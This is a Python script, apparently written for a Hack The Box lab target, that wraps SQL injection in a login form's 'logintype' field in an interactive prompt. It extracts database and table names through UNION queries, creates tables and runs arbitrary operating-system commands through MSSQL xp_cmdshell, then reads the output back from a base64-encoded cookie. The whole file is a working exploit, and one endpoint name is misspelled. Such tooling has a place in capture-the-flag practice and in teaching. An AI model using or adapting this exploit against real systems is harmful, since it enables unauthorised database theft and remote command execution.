import requests
from cmd import Cmd
import urllib.parse
import re
from base64 import b64decode

proxies={'http':'http://127.0.0.1:8080'}
headers={'Host': 'members.streetfighterclub.htb','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8','Accept-Language': 'en-US,en;q=0.5','Accept-Encoding': 'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','Content-Length':'100','Origin': 'http://members.streetfighterclub.htb','Connection':'close','Referer':'http://members.streetfighterclub.htb/old/login.asp','Cookie': 'ASPSESSIONIDQQCSSDBD=JMBNCJICHNAOOIDNFOLMAMCK','Upgrade-Insecure-Requests': '1'}


class Terminal(Cmd): 
 prompt="==>"

 def default(self,args):
  print('simon')

 def do_extract_database(self,args):
  data={'username':'simon','password':'pass123','logintype':'2 union select 1,2,3,4,'+args+',6','rememberme':'ON','B1':'Login'}
  data_str=urllib.parse.urlencode(data,safe=',()')
  res=requests.post('http://members.streetfighterclub.htb/old/verify.asp',data=data_str,proxies=proxies,allow_redirects=False,headers=headers)
  print(b64decode(res.cookies['Email']))


 def do_extract_table(self,args):
  data={'username':'simon','password':'pass123','logintype':'2 union select 1,2,3,4,string_agg(concat(name,":",id),"|"),6 from '+args+'..sysobjects where xtype="u-- -"','rememberme':'ON','B1':'Login'}
  data_str=urllib.parse.urlencode(data,safe=',()"|=/:')
  res=requests.post('http://members.streetfighterclub.htb/old/veriyfy.asp',data=data_str,proxies=proxies,allow_redirects=False,headers=headers)
  print(res.cookies)


 def do_create(self,args):
  try:
   arg1,arg2=args.split("!")
   print('arg1 '+arg1)
   print('\narg2 '+arg2)
   data={'username':'simon','password':'pass123','logintype':'2;create table '+arg1+'(ID int IDENTITY (1,1) PRIMARY KEY,output varchar(8000))','rememberme':'ON','B1':'Login'}
   data_str=urllib.parse.urlencode(data,safe=",/;(\)':|=")
   res=requests.post('http://members.streetfighterclub.htb/old/verify.asp',data=data_str,proxies=proxies,allow_redirects=False,headers=headers)
   print('Table '+args+' was created')
   data2={'username':'simon','password':'pass123','logintype':'2;insert into '+arg1+' (output) exec Xp_CmdSHelL \''+arg2+'\';-- -','rememberme':'ON','B1':'Login'}
   data2_str=urllib.parse.urlencode(data2,safe=",;\()'|:/=") 
   res2=requests.post('http://members.streetfighterclub.htb/old/verify.asp',data=data2_str,proxies=proxies,allow_redirects=False,headers=headers)
   print('Command '+arg2+' was inserted')
  except:
   print('you need to specify table_name and command (separated by !)')

 def do_select(self,args):
  i=1
  while i<100:
    i=i+1
    data={'username':'simon','password':'pass123','logintype':'2 union select 1,2,3,4,(select top 1 output from '+args+' where ID='+str(i)+'),6-- -','rememberme':'ON','B1':'Login'}
    data_str=urllib.parse.urlencode(data,safe=',;\(/)":|=')
    try:
     res=requests.post('http://members.streetfighterclub.htb/old/verify.asp',data=data_str,proxies=proxies,allow_redirects=False,headers=headers)
     print(b64decode(urllib.parse.unquote(res.cookies['Email']))) 
    except:
     continue  
  
  
  

term=Terminal().cmdloop()


